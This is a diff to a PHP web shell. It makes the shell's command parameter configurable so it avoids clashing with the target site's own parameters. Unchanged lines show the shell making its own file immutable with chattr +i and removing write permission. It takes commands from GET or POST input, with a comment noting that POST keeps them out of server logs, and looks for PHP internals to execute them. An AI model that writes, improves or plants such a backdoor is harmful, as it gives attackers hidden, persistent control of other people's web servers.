@@ -13,11 +13,14 @@ $this_file = __FILE__;
 @system("chmod ugo-w $this_file");
 @system("chattr +i $this_file");
 
+# Name of the parameter (GET or POST) for the command. Change this if the target already use this parameter.
+$cmd = 'cmd';
+
 # test if parameter 'cmd' is present. If not this will avoid an error on logs or on all pages if badly configured.
-if(isset($_REQUEST['cmd'])) {
+if(isset($_REQUEST[$cmd])) {
 
     # grab the command we want to run from the 'cmd' GET or POST parameter (POST don't display the command on apache logs)
-    $command = $_REQUEST['cmd'];
+    $command = $_REQUEST[$cmd];
 
     # Try to find a way to run our command using various PHP internals
     if (class_exists('ReflectionFunction')) {
